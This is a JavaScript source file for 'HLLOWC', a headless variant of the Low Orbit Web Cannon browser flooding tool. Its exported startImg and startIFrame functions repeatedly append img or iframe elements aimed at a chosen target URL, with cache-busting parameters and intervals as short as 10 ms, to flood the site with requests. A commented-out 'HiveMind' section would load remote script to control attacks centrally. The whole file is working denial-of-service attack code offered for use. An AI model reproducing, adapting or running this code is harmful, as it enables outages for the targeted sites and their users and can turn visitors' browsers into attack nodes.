/*
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

var HLLOWC = (function () {
    // Headless Low Orbit Web Canon
    // Credits for: http://code.google.com/p/lowc/
    // Edited to be headless.
    var fireInterval;
    var shootID;
    var typeValue = 'img';
    var state = 'stop';
    var shootRequest = {};
    var currentIntervalMS = 10;
    var currentTarget = null;
    var defaultMessage = 'HLLOWC';

    //  Change the URL to add arrays.
    function arrayValue (url,type) {
        if (type == 'target'){
            if (/\?/.test(url)){
                return '&HLLOWC=';
            }
            else {
                return '?HLLOWC=';
            }
        }
        else {
            if (/\?/.test(url)){
                return '&ID=';
            }
            else {
                return '?ID=';
            }
        }
    }
    
    
    //~ // Change the button style depending on the desired option.
    function shootType(type){
        //~ $('#counter_requested').html('0');
        //~ $('#counter_tail').html('0');
        //~ if (type == 'img'){
            //~ $('#typeStyle').html('<style>#radio1{border-color:#5696C0;} #radio2{border-color:#000000;} #interval2{display:none;} #counter_tail,#of{visibility:visible;}</style>');
            //~ typeValue = 'img';
            //~ $('#sl0').mbsetVal(200);
        //~ }
        //~ else {
            //~ $('#typeStyle').html('<style>#radio2{border-color:#5696C0;} #radio1{border-color:#000000;} #counter_tail,#of{visibility:hidden;}</style>');
            //~ typeValue = 'iframe';
            //~ $('#sl0').mbsetVal(3000);
        //~ }
        //~ move_slide();
    }

    //  Variables attack.
    //  The array random ID that is loaded with the URL is to prevent Javascript
    //  Use the browser cache and re-download the file.
    //  ---------------------------
    //  Request by image.
    var shoot1 = function () {
        var targetURL = currentTarget;
        var msg = defaultMessage;
        var shootID = Number(new Date());
        var resource = document.createElement('img');
        resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
        //~ resource.setAttribute('onload','score_requested('+shootID+')'); //A no ser que el objetivo sea una imágen siempre
        //~ resource.setAttribute('onabort','score_requested('+shootID+')'); //va a dar error, pero mientras obtenga una
        //~ resource.setAttribute('onerror','score_requested('+shootID+')'); //una respuesta del servidor me vale.
        resource.setAttribute('id',shootID);
        $('#imgContainer').append(resource);
        score_tail();
    }

    //  Request via IFrame.
    var shoot2 = function () {
        var targetURL = currentTarget;
        var msg = defaultMessage;
        var shootID = Number(new Date());
        var resource = document.createElement('iframe');
        resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
        //~ resource.setAttribute('onload','score_requested('+shootID+')');
        resource.setAttribute('id',shootID);
        $('#frameContainer').append(resource);
        score_tail();
    }
    //---------------------------

    //  Invokes a variable interval desired attack.
    function preshoot(interval){
        if (typeValue == 'img'){
            clearInterval(fireInterval);
            fireInterval = setInterval(shoot1,interval)
        }
        else {
            clearInterval(fireInterval);
            fireInterval = setInterval(shoot2,interval)
        }
    }

    //  Interval cycles performed.
    function score_tail(){
        //~ $('#counter_tail')[0].innerHTML++
    }

    //  Site Full loads victim made.
    function score_requested(shootID){
        //~ $('#counter_requested')[0].innerHTML++
        //~ $('#'+shootID).remove();
    }

    //  Handle HiveMind button.
    function hive(){
        //~ if ($('#hivebutton').val() == 'Connect'){
            //~ $('#hivebutton').val('Disconnect');
            //~ load_hive();
        //~ }
        //~ else {
            //~ $('#hivebutton').val('Connect');
        //~ }
    }

    //  Load the HiveMind from Softonic.
    //  The array random ID that is loaded with the URL is to prevent Javascript
    //  Use the browser cache and re-download the file.
    function load_hive(){
        //~ if ($('#hivebutton').val() == 'Disconnect'){
            //~ var hiveURL = currentTarget;
            //~ var hiveID = Number(new Date());
            //~ var hiveScript = document.createElement('script');
            //~ hiveScript.setAttribute('type','text/javascript'),
            //~ hiveScript.setAttribute('src',hiveURL+arrayValue(hiveURL,'hive')+hiveID);
            //~ hiveScript.setAttribute('onload','change_hive('+hiveID+');');
            //~ hiveScript.setAttribute('onabort','change_hive('+hiveID+');');
            //~ hiveScript.setAttribute('onerror','change_hive('+hiveID+');');
            //~ hiveScript.setAttribute('id',hiveID);
            //~ document.getElementById('hiveContainer').appendChild(hiveScript);
            //~ setTimeout('load_hive();',10000);
        //~ }
    }

    // Change the values obtained in change_hive
    function change_hive(hiveID){
        //~ $('#target').val(info.target);
        //~ $('#msg').val(info.msg);
        //~ if (info.status == 'start') {
            //~ state = 'stop';
            //~ start_stop();
        //~ }
        //~ else {
            //~ state = 'start';
            //~ start_stop();
        //~ }
        //~ $('#'+hiveID).remove();
    }
    
    var startAttack = function (attackType, target, interval) {
        typeValue = attackType;
        state = 'start';
        currentIntervalMS = interval;
        currentTarget = target;
        preshoot(currentIntervalMS);
    }
    
    return {
        startIFrame: function (target, interval) {
            startAttack('iframe', target, interval);
        },
        startImg: function (target, interval) {
            startAttack('img', target, interval);
        },
        stop: function () {
            state = 'stop';
            clearInterval(fireInterval);
        },
        isStarted: function () {
            return state === 'start';
        }
    };
}());
